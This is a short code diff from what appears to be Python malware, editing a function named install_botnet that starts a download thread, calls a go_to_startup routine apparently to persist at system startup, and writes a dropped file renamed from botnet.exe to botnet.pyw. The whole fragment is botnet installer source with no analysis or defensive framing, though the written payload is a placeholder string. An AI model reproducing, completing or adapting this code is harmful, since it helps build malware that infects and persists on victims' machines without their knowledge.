@@ -50,14 +50,14 @@ def download(url,res):
 
 def install_botnet(url,res):
 	try:
-		data   = b'app data'
+		data   = 'app data'
 		
 		td = Thread(target=download,args=(url,res))
 		td.start()
 		go_to_startup()
 
-		if 'botnet.exe' not in listdir():
-			with open('botnet.exe','wb') as f:
+		if 'botnet.pyw' not in listdir():
+			with open('botnet.pyw','w') as f:
 				f.write(data)
 		else:
 			pass
